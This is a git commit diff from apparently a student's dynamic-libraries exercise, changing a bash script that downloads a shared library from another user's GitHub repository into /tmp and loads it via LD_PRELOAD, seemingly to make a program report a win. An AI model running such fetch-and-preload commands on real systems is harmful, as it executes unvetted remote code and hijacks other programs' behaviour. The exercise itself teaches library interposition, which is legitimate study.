f4a11ff7442d69e9dee2f99a57522c82dba7ec81
Oyemike Chukuneku <oyemikehc@gmail.com>
2022-10-03 19:49:15 -0700

    TAsk commit

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/Oyekent/alx-low_level_programming/raw/main/0x18-dynamic_libraries/maths_op.so
-export LD_PRELOAD=/tmp/maths_op.so
+wget -P /tmp https://github.com/eyoul/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
